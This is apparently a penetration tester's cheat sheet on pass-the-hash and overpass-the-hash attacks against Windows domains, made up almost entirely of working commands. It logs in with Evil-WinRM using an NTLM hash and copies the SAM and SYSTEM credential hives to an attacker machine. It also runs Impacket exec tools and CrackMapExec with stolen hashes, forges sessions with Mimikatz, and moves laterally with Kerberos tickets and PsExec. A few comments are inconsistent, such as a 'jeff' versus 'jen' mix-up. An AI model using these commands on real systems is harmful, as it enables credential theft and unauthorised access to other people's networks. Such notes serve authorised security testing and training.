Pre-requisites for PtH to work:
- An SMB connection through the firewall (commonly port 445)
- The Windows File and Printer Sharing feature should be enabled

# Evil-WinRM
https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/
You can login to a user using `Evil-WinRM` if it's in the *Remote Management Users* group.
```sh
evil-winrm -i 10.10.141.46 -u administrator -H 0e0363213e37b94221497260b0bcb4fc

# -i : IP
# -u : Username
# -p : Password
# -H : NTLM Hash

# Download file into kali
download .\SAM /opt/Juggernaut/JUGG-Backup/SAM
download .\SYSTEM /opt/Juggernaut/JUGG-Backup/SYSTEM

# Upload file
upload /root/notes.txt
```


## If PowerShell is not working
```sh
# If you only have the NT hash of the user, take LM hash as 32 0's
psexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
smbexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
wmiexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
atexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET' whoami
dcomexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'

crackmapexec smb $TARGETS --local-auth -u $USER -H $NThash -x whoami
crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -x whoami

# Mimikatz on Windows
sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$NThash
```

https://www.thehacker.recipes/a-d/movement/ntlm/pth
---
# Pass-The-Hash with RDP
[Passing the Hash with Remote Desktop | Kali Linux Blog](https://www.kali.org/blog/passing-hash-remote-desktop/)

---
# Over-Pass the Hash
With overpass the hash, we can "over" abuse an NTLM user hash to gain a full Kerberos **Ticket Granting Ticket** (TGT). Then we can use the TGT to obtain a **Ticket Granting Service** (TGS).
> Used when you want to authenticate over Kerberos instead of NTLM!

```mimikatz
# Get NTLM hash of the domain user
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

*At this point, running the whoami command on the newly created PowerShell session would show jeff's identity instead of jen. While this could be confusing, this is the intended behavior of the whoami utility which only checks the current process's token and does not inspect any imported Kerberos tickets.*

```powershell
# Get TGT by authenticating to the intended network share
net use \\files04
The command completed successfully.

# Check TGT
klist

# Use PsExec to logon to the machine
.\PsExec.exe \\files04 cmd
```